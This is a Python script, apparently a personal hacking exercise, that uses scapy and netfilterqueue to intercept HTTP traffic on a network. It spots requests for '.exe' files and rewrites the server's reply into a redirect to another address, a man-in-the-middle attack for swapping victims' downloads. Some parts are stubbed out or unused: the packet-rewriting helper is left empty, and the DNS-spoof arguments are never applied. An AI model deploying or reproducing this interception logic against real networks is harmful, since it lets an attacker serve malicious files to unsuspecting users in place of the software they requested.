# Built-in imports
import sys; sys.path.append("/home/darkest/Dropbox/code/darkest/python")
import argparse

# Third-party imports
import scapy.all as scapy
import netfilterqueue

# DarkestAPi imports
import darkest.Core as dac




class UserData():
  Address: ...
  DNSIp: ...

listAck = []




def setLoad(packet, load):
  ...


def processPacket(packet):
  packetScapy = scapy.IP(packet.get_payload())
  if packetScapy.haslayer(scapy.Raw):
    print(packetScapy.show())

    if packetScapy[scapy.TCP].dport == 80:
      if ".exe" in packetScapy[scapy.Raw].load:
        print("[+] exe Request")
        listAck.append(packetScapy[scapy.TCP].ack)

    elif packetScapy[scapy.TCP].sport == 80:
      print("HTTP Response")
      if packetScapy[scapy.TCP].seq in listAck:
        listAck.remove(packetScapy[scapy.TCP].seq)
        print("[+] Replacing file")
        packetModified = setLoad(packetScapy, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp")

        packet.set_payload(str(packetModified))

  packet.accept()




def syntaxCreator():
  """Creates the command's syntax object and returns it.
  """
  parser = argparse.ArgumentParser()
  parser.add_argument("-q", "--queue", default=0, type=int, help="Queue number, default is 0.")
  parser.add_argument("-a", "--address", default="www.google.com", type=str, help="Target web page address.")
  parser.add_argument("-i", "--ip", default="192.168.8.152", type=str, help="Spoof dns server address.")
  return parser.parse_args()


if __name__ == "__main__":
  args = syntaxCreator()

  # dac.Net.flushIpTables()

  userData = UserData()
  # Could be done in the constructor directly but lets keep it as class variables 
  userData.Address = args.address
  userData.DNSIp = args.ip

  queueIndx = dac.Net.createIpTables("local")
  try:
    dac.Net.bindIpTables(queueIndx, processPacket)

  except KeyboardInterrupt:
    print("\n[+] Flushing  ip tables, please wait.\n")
    dac.Net.flushIpTables()

